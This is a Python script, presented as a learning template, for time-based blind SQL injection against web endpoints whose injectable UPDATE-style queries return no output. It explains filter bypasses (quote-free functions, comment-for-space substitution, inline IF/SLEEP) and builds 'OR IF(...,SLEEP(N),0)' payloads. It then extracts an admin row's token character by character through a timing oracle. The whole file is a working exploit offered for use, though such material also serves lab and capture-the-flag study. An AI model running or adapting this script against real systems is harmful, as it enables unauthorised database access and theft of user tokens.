#!/usr/bin/env python3
"""
Time-Based Blind SQLi — Minimal Script (Learning Template)
============================================================
Stripped to essentials. For UPDATE/INSERT/DELETE injection points
where no SELECT output is returned. Uses SLEEP() as the oracle.

Typical scenario: Java/PHP endpoint with:
    UPDATE users SET isActive=true WHERE id=<injectable>
No query results returned → boolean blind won't work → time-based is the only oracle.

Filter bypass covered:
  - Java escapeString strips ' " \\ \\n ;  →  ASCII/LENGTH/SUBSTRING return numbers (no quotes)
  - No semicolons                          →  IF(cond, SLEEP(N), 0) inline expression
  - PHP strpos space filter (if present)  →  use /**/ instead of spaces

CRITICAL: conditions must wrap the subquery in parens before the comparison operator.
  WRONG: SELECT LENGTH(token) FROM users WHERE role_id=1 LIMIT 1=12
         → "=12" binds to "LIMIT 1" → syntax error → silent failure
  RIGHT: (SELECT LENGTH(token) FROM users WHERE role_id=1 LIMIT 1)=12
         → subquery in parens, comparison outside

Config: URL, METHOD, PARAM, COOKIE, SLEEP_SECONDS, TABLE, COLUMN, ROW_CONDITION
        ROW_CONDITION: a WHERE clause to find the target row (e.g., "role_id=1" or "LENGTH(token)=64")
"""
import time, requests

# ==================== CONFIG ====================
URL = "http://target/api/activate"
METHOD = "POST"          # "POST" and "GET"
PARAM = "id"             # injectable parameter name
SESSION_COOKIE = ""      # PHPSESSID or JSESSIONID, "" if none
COOKIE_NAME = "PHPSESSID"
SLEEP_SECONDS = 2        # delay for TRUE condition

TABLE = "users"
COLUMN = "token"
# How to find the admin row without knowing its ID:
ROW_CONDITION = "role_id=1"       # e.g., "role_id=1" or "LENGTH(token)=64"
# ================================================

COOKIES = {COOKIE_NAME: SESSION_COOKIE} if SESSION_COOKIE else {}

def check(condition):
    """True if condition is TRUE (SLEEP triggers → slow response)."""
    payload = "1 OR IF((" + condition + "),SLEEP(" + str(SLEEP_SECONDS) + "),0)"
    data = {PARAM: payload}
    start = time.time()
    if METHOD == "POST":
        requests.post(URL, data=data, cookies=COOKIES, timeout=10)
    else:
        requests.get(URL, params=data, cookies=COOKIES, timeout=10)
    return time.time() - start >= SLEEP_SECONDS

# Find length (don't hardcode — discover it)
# NOTE: subquery MUST be wrapped in parens before =N comparison
length = 0
for n in range(1, 200):
    if check(f"(SELECT LENGTH({COLUMN}) FROM {TABLE} WHERE {ROW_CONDITION} LIMIT 1)={n}"):
        length = n
        break
print("Length:", length)

# Extract each char via binary search (ASCII 32-126, ~7 requests per char)
token = ""
for pos in range(1, length + 1):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        cond = f"(SELECT ASCII(SUBSTRING({COLUMN},{pos},1)) FROM {TABLE} WHERE {ROW_CONDITION} LIMIT 1)>{mid}"
        if check(cond):
            low = mid + 1
        else:
            high = mid
    token += chr(low)
    print(f"[{pos}/{length}] {token}")

print(f"{COLUMN}:", token)
